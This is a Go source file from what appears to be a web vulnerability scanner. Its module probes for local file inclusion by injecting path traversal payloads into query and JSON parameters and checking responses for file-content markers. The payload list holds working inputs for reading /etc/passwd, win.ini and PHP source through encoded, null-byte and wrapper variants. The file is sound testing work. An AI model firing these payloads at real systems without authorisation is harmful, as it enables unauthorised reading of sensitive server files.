// Package lfi detects local file inclusion / path traversal by trying
// classic traversal payloads and looking for canonical file content.
package lfi

import (
	"github.com/chud-lori/ngehe/internal/config"
	"github.com/chud-lori/ngehe/internal/finding"
	"github.com/chud-lori/ngehe/internal/fuzz"
	"github.com/chud-lori/ngehe/internal/har"
	"github.com/chud-lori/ngehe/internal/httpx"
	"github.com/chud-lori/ngehe/internal/oracle"
	"github.com/chud-lori/ngehe/internal/session"
)

type probe struct {
	payload string
	markers []string
	note    string
}

var probes = []probe{
	{"../../../../etc/passwd", []string{"root:x:", "root:!:", "root:*:"}, "linux /etc/passwd via traversal"},
	{"../../../../../../etc/passwd", []string{"root:x:", "root:!:", "root:*:"}, "deeper linux /etc/passwd traversal"},
	{"/etc/passwd", []string{"root:x:", "root:!:", "root:*:"}, "absolute linux /etc/passwd path"},
	{"....//....//....//etc/passwd", []string{"root:x:", "root:!:", "root:*:"}, "linux /etc/passwd via dot-dot bypass"},
	{"..%2f..%2f..%2fetc%2fpasswd", []string{"root:x:", "root:!:", "root:*:"}, "url-encoded linux traversal"},
	{"%2e%2e/%2e%2e/%2e%2e/etc/passwd", []string{"root:x:", "root:!:", "root:*:"}, "double-encoded linux traversal"},
	{"../../../../etc/passwd%00", []string{"root:x:", "root:!:", "root:*:"}, "null-byte linux traversal"},
	{"../../../../windows/win.ini", []string{"[fonts]", "[extensions]"}, "windows win.ini via traversal"},
	{"..\\..\\..\\..\\windows\\win.ini", []string{"[fonts]", "[extensions]"}, "windows backslash traversal"},
	{"php://filter/convert.base64-encode/resource=index.php", []string{"PD9waHA"}, "PHP filter wrapper leaking source as base64"},
	{"file:///etc/passwd", []string{"root:x:", "root:!:", "root:*:"}, "file:// wrapper read"},
}

func Run(reqs []har.Request, sessions []session.Session, cfg *config.Config) []finding.Finding {
	client := httpx.NewClient(cfg.Replay.TimeoutMS)
	maxBody := cfg.Replay.MaxBodyBytes
	if maxBody == 0 {
		maxBody = 256 * 1024
	}
	var out []finding.Finding

	for _, r := range reqs {
		b := bearer(r, sessions)
		for _, p := range probes {
			done := false
			for _, inj := range injections(r, p.payload) {
				resp := httpx.FireRequest(client, inj.Request, b, maxBody)
				if m := oracle.StringOracle(resp.Body, p.markers...); m != "" {
					out = append(out, finding.Finding{
						Rule: "lfi-path-traversal", Severity: finding.SevCritical,
						Method: inj.Request.Method, URL: inj.Request.URL, Path: inj.Request.Path,
						Param: inj.Param, Payload: inj.Payload,
						Evidence: p.note + ": " + m,
						Why:      "file contents leaked through parameter — LFI / path traversal",
					})
					done = true
					break
				}
			}
			if done {
				break
			}
		}
	}
	return out
}

func injections(r har.Request, payload string) []fuzz.Injection {
	out := fuzz.QueryParams(r, payload)
	out = append(out, fuzz.JSONStrings(r, payload)...)
	return out
}

func bearer(r har.Request, sessions []session.Session) httpx.Bearer {
	name := session.IdentifyBaseline(r.Headers["Authorization"], sessions)
	for _, s := range sessions {
		if s.Name == name {
			return httpx.Bearer{Token: s.Bearer, Headers: s.Headers}
		}
	}
	if len(sessions) > 0 {
		return httpx.Bearer{Token: sessions[0].Bearer, Headers: sessions[0].Headers}
	}
	return httpx.Bearer{}
}
